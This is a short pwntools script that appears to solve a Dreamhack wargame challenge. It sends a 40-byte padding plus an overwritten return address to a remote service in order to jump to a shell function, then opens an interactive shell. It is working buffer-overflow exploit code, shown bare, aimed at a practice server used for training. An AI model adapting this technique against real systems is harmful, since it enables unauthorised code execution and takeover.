from pwn import *

p = remote('host1.dreamhack.games', 14503)

shellAddr = p32(0x0804867b)

p.sendline(b"A" * 40 + shellAddr)

p.interactive()
